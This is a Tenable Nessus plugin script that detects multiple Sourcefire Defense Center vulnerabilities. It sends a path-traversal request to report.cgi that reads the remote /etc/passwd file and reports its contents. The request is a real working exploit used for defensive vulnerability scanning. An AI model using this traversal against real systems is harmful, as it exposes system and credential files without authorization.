#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(69441);
  script_version("$Revision: 1.9 $");
  script_cvs_date("$Date: 2015/09/24 23:21:20 $");

  script_bugtraq_id(52887);
  script_osvdb_id(80954);
  script_xref(name:"IAVB", value:"2012-B-0046");

  script_name(english:"Sourcefire Defense Center Multiple Security Vulnerabilities");
  script_summary(english:"Tries to read /etc/passwd using SourceFire Defense Center");

  script_set_attribute(attribute:"synopsis", value:
"The remote SourceFire Defense Center installation is affected by
several security issues.");
  script_set_attribute(attribute:"description", value:
"The remote host is a SourceFire Defense Center appliance.  The remote
version of this software is affected by the following vulnerabilities :

  - Two arbitrary file download vulnerabilities that allow
    an attacker to read arbitrary files on the remote file
    system.

  - An arbitrary file deletion vulnerability that allows an
    attacker to delete arbitrary files on the remote file
    system.

  - A permanent cross site scripting vulnerability.");
  script_set_attribute(attribute:"see_also", value:"http://seclists.org/fulldisclosure/2012/Apr/52");
  script_set_attribute(attribute:"solution", value:"Contact the vendor for a patch.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(20, 74, 79, 442, 629, 711, 712, 722, 725, 750, 751, 800, 801, 809, 811, 864, 900, 928, 931, 990);

  script_set_attribute(attribute:"vuln_publication_date", value:"2012/04/04");
  script_set_attribute(attribute:"plugin_publication_date", value:"2013/08/22");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"stig_severity", value:"I");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2013-2015 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:443);

r = http_send_recv3(method:"GET", port: port,
    item:"/");

if ( isnull(r)) exit(0, "No answer");

if ( "/login.cgi" >!< r[1] ) exit(0, "Not a SourceFire Defense Center host");

file = "/etc/passwd";
r = http_send_recv3(method:"GET", port: port,
    item:"/ComparisonViewer/report.cgi?file=../../../../../" + file);

if (isnull(r)) exit(0);
res = r[2];


if ( strlen(egrep(pattern:"root:.*:0:[01]:", string:res)) )
  {
     set_kb_item(name:'www/'+port+'/XSS', value:TRUE);

     report = string(
        "\n",
        "Here are the repeated contents of the file '/etc/passwd'\n",
        "that Nessus was able to read from the remote host :\n",
        "\n",
       res
      );

    security_hole(port:port, extra:report);
    exit(0);
  }
